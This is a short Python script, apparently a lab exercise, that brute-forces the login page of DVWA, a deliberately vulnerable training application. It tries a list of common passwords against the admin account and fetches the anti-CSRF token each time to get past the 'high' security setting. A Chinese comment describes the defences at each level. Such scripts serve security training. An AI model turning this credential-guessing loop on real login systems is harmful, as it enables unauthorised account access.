import time

from dvwa import DVWA

SECURITY = "high"
USERNAME = "admin"
PASSWORDS = [
    "123456",
    "111",
    "admin",
    "admin123",
    "password",
    "12345678",
    "letmein",
    "qwerty",
]
"""
Low: 无防护, 直接干
Medium: 失败后 sleep 2 秒, 拖慢爆破
High: 需要 user_token, 失败后随机 sleep
"""

target = DVWA("brute", SECURITY)

for password in PASSWORDS:
    print(f"Testing: {USERNAME} / {password}")
    params = {
        "username": USERNAME,
        "password": password,
        "Login": "Login",
    }
    if SECURITY == "high":
        params["user_token"] = target.token()
    response = target.get("", params=params)
    if (
        "Welcome to the password protected area"
        in response.text
    ):
        print(f"Success: {USERNAME} / {password}")
        break
    time.sleep(0.5)
else:
    print("No password matched.")
